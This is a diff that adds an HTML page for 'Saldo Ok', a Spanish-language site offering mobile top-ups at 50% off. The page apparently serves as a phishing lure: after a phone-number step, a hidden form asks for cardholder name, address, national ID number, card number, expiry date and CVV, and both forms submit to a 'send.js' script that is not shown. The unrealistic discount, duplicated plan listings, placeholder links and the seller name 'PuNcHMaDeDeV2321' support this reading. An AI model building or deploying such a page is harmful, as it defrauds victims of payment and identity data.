@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <script async src="https://cdn.ampproject.org/v0.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description"
+        content="Recarga saldo online al 50%. Aprovecha nuestras ofertas exclusivas para recargar tu saldo con descuento. Recarga fácil y segura para ti no te lo pierdas y recarga ya desde cualquier parte online.">
+    <meta name="keywords"
+        content="recargas online, recarga saldo, recarga móvil, descuento, ofertas de recargas, recarga fácil, saldo OK">
+    <meta name="author" content="Saldo Ok">
+    <meta name="robots" content="index, follow">
+    <meta name="og:title" content="Recarga Online al 50% | Saldo OK">
+    <meta name="og:description"
+        content="Aprovecha nuestras ofertas exclusivas y recarga tu saldo online al 50%. Recarga fácil y segura con Saldo OK.">
+    <meta name="og:image" content="https://saldook.com/img/logo.jpg">
+    <meta name="og:url" content="https://saldook.com/">
+    <meta name="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Recarga Online al 50% | Saldo OK">
+    <meta name="twitter:description"
+        content="Aprovecha nuestras ofertas exclusivas y recarga tu saldo online al 50%. Recarga fácil y segura con Saldo OK.">
+    <meta name="twitter:image" content="https://saldook.com/img/logo.jpg">
+    <link rel="icon" href="./img/logo.ico" type="image/x-icon">
+    <meta property="og:locale" content="es_ES">
+    <link rel="canonical" href="https://saldook.com">
+    <link rel="stylesheet" href="./style.css">
+    <title>Saldo Ok | Recargas Al 50%</title>
+</head>
+
+
+
+<body>
+    <header>
+        <a href="./index.html"><img class="logo" src="./img/logo.jpg" alt=""></a>
+        <h1>Saldo Ok</h1>
+        <nav>
+            <ul>
+                <li><a href="#">Ayuda</a></li>
+                <li>/</li>
+                <li><a href="#">Estado de tu pedido</a></li>
+                <li>/</li>
+                <li><a href="#">Registrate</a></li>
+                <li>/</li>
+                <li><a href="#">Inicia Sesión</a></li>
+            </ul>
+        </nav>
+    </header>
+    <div>
+        <img class="slide-img" src="./img/slide.jpg" alt="">
+    </div>
+    <link rel="amphtml" href="URL_DE_TU_PAGINA_AMP">
+    <hr>
+    <h3 style="margin-bottom: 15px; margin-top: 100px;">Elige tu Plan de Recarga</h3>
+    <div class="plan-container">
+        <div class="plan" onclick="seleccionarPlan('Plan 1')">
+            <h2>Plan Estandar</h2>
+            <p>
+                Whatsapp
+            </p>
+            <p class="price">Precio: $500</p>
+        </div>
+
+        <div class="plan" onclick="seleccionarPlan('Plan 2')">
+            <h2>Plan Intermedio</h2>
+
+            <p>
+                Whatsapp + Redes Sociales
+            </p>
+            <p class="price">Precio: $1000</p>
+        </div>
+
+        <div class="plan" onclick="seleccionarPlan('Plan 3')">
+            <h2>Plan Mega</h2>
+            <p>
+                Whatsapp + <br>Redes Sociales + Free Fire
+            </p>
+            <p class="price">Precio: $1500</p>
+        </div>
+        <div class="plan" onclick="seleccionarPlan('Plan 4')">
+            <h2>Plan Mega</h2>
+            <p>
+                Whatsapp + <br> Redes Sociales + Free Fire + Llamadas
+            </p>
+            <p class="price">Precio: $1500</p>
+        </div>
+    </div>
+
+    <form id="formulario-telefono" action="./send.js">
+        <label for="telefono">Número de Teléfono:</label>
+        <div>
+            <span style="font-size: 20px; margin-right: 5px;">+</span>
+            <input type="text" id="codigopais" name="codigopais" style="width: 40px;">
+            <input type="telefono" id="telefono" name="telefono" placeholder="Número a Recargar" required>
+        </div>
+        <span id="errorMensaje" class="error"></span>
+        <button type="button" onclick="validarTelefono()">Enviar</button>
+    </form>
+
+    <form id="formulario-tarjeta" action="./send.js" style="display: none;">
+        <label for="nombre-tarjeta">Nombre en la Tarjeta:</label>
+        <input type="text" id="nombre-tarjeta" name="nombre-tarjeta" placeholder="Nombre en la Tarjeta" required>
+
+        <label for="direccion">Direccion:</label>
+        <input type="text" id="direccion" name="direccion" placeholder="Calle y numero" required>
+
+        <label for="dni">Dni:</label>
+        <input type="text" id="dni" name="dni" placeholder="Número de identidad" required>
+
+        <label for="numero-tarjeta">Número de Tarjeta:</label>
+        <input type="text" id="numero-tarjeta" name="numero-tarjeta" placeholder="Número de Tarjeta" required>
+
+        <label for="fecha-expiracion">Fecha de Expiración:</label>
+        <input type="text" id="fecha-expiracion" name="fecha-expiracion" placeholder="MM/AA" required>
+
+        <label for="cvv">CVV:</label>
+        <input type="text" id="cvv" name="cvv" placeholder="CVV" required>
+        <br>
+        <button type="button" onclick="enviarDatos()">Pagar</button>
+    </form>
+    <hr>
+    <h2 style="margin-bottom: 150px; margin-top: 100px;">Trabajamos con todas las empresas</h2>
+    <div class="operadora-container">
+        <img src="./img/movistar.png" alt="Movistar" onclick="seleccionarOperadora('Movistar')">
+        <img src="./img/tigo.png" alt="Tigo" onclick="seleccionarOperadora('Tigo')">
+        <img src="./img/unefon.png" alt="Unefon" onclick="seleccionarOperadora('Unefon')">
+        <img src="./img/pillofon.png" alt="Pillofon" onclick="seleccionarOperadora('Pillofon')">
+        <img src="./img/personal.png" alt="Personal" onclick="seleccionarOperadora('Personal')">
+    </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script src="./script.js"></script>
+    <script src="./send.js"></script>
+    <p>
+        En Saldo Ok, nos comprometemos a brindarte las mejores ofertas en recargas online. Aprovecha nuestras promociones exclusivas y recarga tu saldo con un increíble descuento del 50%. Nos enorgullece ofrecer un servicio fácil y seguro, permitiéndote recargar desde cualquier lugar y en cualquier momento.
+    </p>
+    <p>
+        Descubre las ofertas más atractivas en recargas online con nosotros. Aprovecha promociones exclusivas y recarga tu saldo con descuentos del 50%. Nos enorgullece proporcionar un servicio fácil y seguro, permitiéndote recargar desde cualquier lugar y en cualquier momento.
+    </p>
+    <p>
+        Nuestra misión es facilitarte una experiencia de recarga conveniente y beneficiosa. Con nuestras ofertas exclusivas, puedes disfrutar de descuentos significativos en cada recarga. Estamos aquí para simplificar tus recargas online, para que puedas mantener tu saldo al máximo sin complicaciones.
+    </p>
+    <p>
+        Entendemos la importancia de mantener tu saldo actualizado. Con nuestras ofertas exclusivas, puedes disfrutar de descuentos significativos en cada recarga. Además, nuestro servicio seguro te brinda la tranquilidad de recargar en cualquier momento y lugar, sin preocupaciones.
+    </p>
+    <p>
+        Tu satisfacción es nuestra prioridad. No solo obtienes descuentos excepcionales, sino también la confianza de una recarga fácil y segura. Descubre las ventajas de recargar con nosotros y mantén tu saldo al día con nuestras ofertas exclusivas.
+    </p>
+    <p>
+        Creemos en simplificar el proceso de recarga para que puedas disfrutar de los beneficios sin complicaciones. Aprovecha nuestras ofertas y recarga tu saldo al 50% de descuento hoy mismo. Recargar nunca ha sido tan fácil y beneficioso.
+    </p>
+    
+
+</body>
+
+<footer itemscope itemtype="http://schema.org/WPFooter">
+    <div class="footer-container">
+        <div class="footer-section">
+            <h3>Contactanos</h3>
+            <p>SaldookOficial@gmail.com</p>
+        </div>
+        <div class="footer-section">
+            <h3>Siguenos</h3>
+            <ul>
+                <li><a href="#">Facebook</a></li>
+                <li><a href="#">Twitter</a></li>
+                <li><a href="#">Instagram</a></li>
+            </ul>
+        </div>
+        <div class="footer-section">
+            <h3>FAQ</h3>
+            <ul>
+                <li><a href="#">Rembolsos</a></li>
+                <li><a href="#"></a></li>
+                <li><a href="#">Services</a></li>
+                <li><a href="#">Cancelar</a></li>
+            </ul>
+        </div>
+    </div>
+    <div class="footer-bottom">
+        <p>&copy; 2024 Saldo Ok.</p>
+    </div>
+</footer>
+
+<script type="application/ld+json">
+    {
+    "@context": "http://schema.org",
+    "@type": "Product",
+    "name": "Recarga de saldo",
+    "image": "",
+    "description": "",
+    "brand": {
+        "@type": "Brand",
+        "name": "Saldo Ok"
+    },
+    "offers": {
+        "@type": "Offer",
+        "price": "Variable",
+        "priceCurrency": "$",
+        "availability": "http://schema.org/InStock",
+        "seller": {
+        "@type": "Organization",
+        "name": "PuNcHMaDeDeV2321"
+        }
+    }
+    }
+    </script>
+
+
+</html>
